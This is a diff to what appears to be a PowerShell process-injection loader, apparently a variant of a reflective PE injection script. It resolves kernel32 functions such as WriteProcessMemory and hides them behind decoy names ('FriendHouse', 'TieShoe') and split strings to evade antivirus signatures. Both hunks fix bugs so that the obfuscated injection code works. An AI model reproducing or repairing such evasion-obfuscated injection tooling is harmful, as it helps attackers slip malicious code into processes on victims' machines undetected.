@@ -429,7 +429,7 @@ $RemoteScriptBlock = {
 		$Win32Functions | Add-Member NoteProperty -Name $FriendHouseName -Value $FriendHouse
 		
 		$FriendHouseExName = $FriendHouseName + "Ex"
-		$FriendHouseExAddr = Get-ProcAddress kernel32.dll FriendHouseEx
+		$FriendHouseExAddr = Get-ProcAddress kernel32.dll $FriendHouseExName
 		$FriendHouseExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		$FriendHouseEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FriendHouseExAddr, $FriendHouseExDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name $FriendHouseExName -Value $FriendHouseEx
@@ -495,7 +495,7 @@ $RemoteScriptBlock = {
 	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
 		
-		$TieShoeName = "Writ" + "eProce" "ssMemory"
+		$TieShoeName = "Writ" + "eProce" + "ssMemory"
 		$TieShoeAddr = Get-ProcAddress kernel32.dll $TieShoeName
         $TieShoeDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
         $TieShoe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TieShoeAddr, $TieShoeDelegate)
